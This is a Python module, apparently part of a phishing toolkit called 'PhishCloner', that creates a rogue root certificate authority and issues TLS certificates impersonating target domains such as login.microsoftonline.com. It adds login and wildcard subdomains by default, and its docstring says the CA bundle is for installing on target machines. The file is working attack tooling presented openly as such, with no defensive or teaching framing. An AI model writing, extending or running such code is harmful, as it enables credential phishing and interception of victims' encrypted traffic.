"""
PhishCloner Engine — Module 1: TLS Spoofer
Signé Ghost1o1 — v1.0.0

Génère des certificats TLS auto-signés qui imitent l'identité d'un domaine cible.
Compatible HSTS sauf si HSTS preloading actif dans le navigateur.
"""

import logging
import subprocess
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

log = logging.getLogger("PhishCloner.TLS")


class TLSSpoofer:
    """Module 1: Génération dynamique de certificats TLS imitant un domaine cible."""

    DEFAULT_ORG = "GhostNet Security"
    DEFAULT_COUNTRY = "US"
    DEFAULT_STATE = "California"
    DEFAULT_LOCALITY = "San Francisco"

    def __init__(
        self,
        ca_cert_path: Optional[str] = None,
        ca_key_path: Optional[str] = None,
        output_dir: str = "certs",
    ):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.ca_cert_path = Path(ca_cert_path) if ca_cert_path else self.output_dir / "phishcloner-ca.pem"
        self.ca_key_path = Path(ca_key_path) if ca_key_path else self.output_dir / "phishcloner-ca-key.pem"

        # Generate CA if not exists
        if not self.ca_cert_path.exists() or not self.ca_key_path.exists():
            self._generate_ca()

    def _generate_ca(self) -> None:
        """Génère une autorité de certification auto-signée (CA)."""
        log.info("Generating self-signed CA...")

        key = rsa.generate_private_key(public_exponent=65537, key_size=4096)

        subject = issuer = x509.Name(
            [
                x509.NameAttribute(NameOID.COUNTRY_NAME, self.DEFAULT_COUNTRY),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, self.DEFAULT_ORG),
                x509.NameAttribute(NameOID.COMMON_NAME, "PhishCloner Root CA"),
            ]
        )

        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.utcnow())
            .not_valid_after(datetime.utcnow() + timedelta(days=3650))
            .add_extension(
                x509.BasicConstraints(ca=True, path_length=None),
                critical=True,
            )
            .sign(key, hashes.SHA256())
        )

        # Save key
        with open(self.ca_key_path, "wb") as f:
            f.write(
                key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption(),
                )
            )
        os.chmod(self.ca_key_path, 0o600)

        # Save cert
        with open(self.ca_cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))

        log.info(f"CA cert: {self.ca_cert_path}")
        log.info(f"CA key:  {self.ca_key_path}")

    def generate_cert(self, target_domain: str, sans: Optional[List[str]] = None) -> Tuple[Path, Path]:
        """
        Génère un certificat serveur imitant un domaine cible.

        Args:
            target_domain: Domaine à imiter (ex: "login.microsoftonline.com")
            sans: Liste de Subject Alternative Names (sous-domaines)

        Returns:
            Tuple (cert_path, key_path)
        """
        if not sans:
            # Generate default SANs
            sans = [
                target_domain,
                f"www.{target_domain}",
                f"login.{target_domain}",
                f"*.{target_domain}",
            ]
        else:
            sans.insert(0, target_domain)

        log.info(f"Generating cert for {target_domain} with {len(sans)} SANs")

        # Generate key
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

        # Load CA
        with open(self.ca_key_path, "rb") as f:
            ca_key = serialization.load_pem_private_key(f.read(), password=None)
        with open(self.ca_cert_path, "rb") as f:
            ca_cert = x509.load_pem_x509_certificate(f.read())

        # Build subject
        subject = x509.Name(
            [
                x509.NameAttribute(NameOID.COUNTRY_NAME, self.DEFAULT_COUNTRY),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, self.DEFAULT_ORG),
                x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
            ]
        )

        # Build cert
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(ca_cert.subject)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.utcnow())
            .not_valid_after(datetime.utcnow() + timedelta(days=365))
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName(s) for s in sans]),
                critical=False,
            )
            .add_extension(
                x509.BasicConstraints(ca=False, path_length=None),
                critical=True,
            )
            .add_extension(
                x509.ExtendedKeyUsage(
                    [
                        x509.ExtendedKeyUsageOID.SERVER_AUTH,
                        x509.ExtendedKeyUsageOID.CLIENT_AUTH,
                    ]
                ),
                critical=False,
            )
            .sign(ca_key, hashes.SHA256())
        )

        # Save key
        safe_name = target_domain.replace(".", "_").replace("*", "wildcard")
        key_path = self.output_dir / f"{safe_name}-key.pem"
        cert_path = self.output_dir / f"{safe_name}-cert.pem"

        with open(key_path, "wb") as f:
            f.write(
                key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption(),
                )
            )
        os.chmod(key_path, 0o600)

        with open(cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))

        log.info(f"Cert: {cert_path}")
        log.info(f"Key:  {key_path}")
        return cert_path, key_path

    def generate_batch(self, domains: List[str]) -> Dict[str, Tuple[Path, Path]]:
        """Génère des certificats pour une liste de domaines."""
        return {d: self.generate_cert(d) for d in domains}

    def get_ca_bundle(self) -> str:
        """Retourne le bundle CA au format PEM (pour install sur postes cibles)."""
        return self.ca_cert_path.read_text()


import os  # noqa: E402
